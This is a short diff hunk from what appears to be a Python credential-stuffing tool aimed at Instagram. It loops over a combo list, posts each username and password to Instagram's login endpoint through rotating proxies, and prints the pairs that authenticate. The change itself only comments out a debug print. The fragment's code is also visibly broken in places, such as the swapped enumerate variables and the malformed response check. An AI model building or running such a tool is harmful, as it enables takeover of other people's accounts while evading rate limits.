@@ -44,7 +44,7 @@ for line, i in enumerate(cambo):
     ##########
     req=r.session()
     ok=req.post("https://Instagram.com/accounts/login/ajax/",headers=headers,data={"username":user,"password":passw}, proxies=pr, timeout=10)
-    print(ok,"\n")
+    #print(ok,"\n")
     ip=Proxies(line)
     if "authenticated"": true" in ok.text:
         print(f"{c.C}UserName {c.R}=> {c.G}{user} {c.R}|| {c.C}Password {c.R}=> {c.G}{passw} {c.R}|| {c.C}Ip {c.R}=> {c.G}{ip}{c.W}\n")
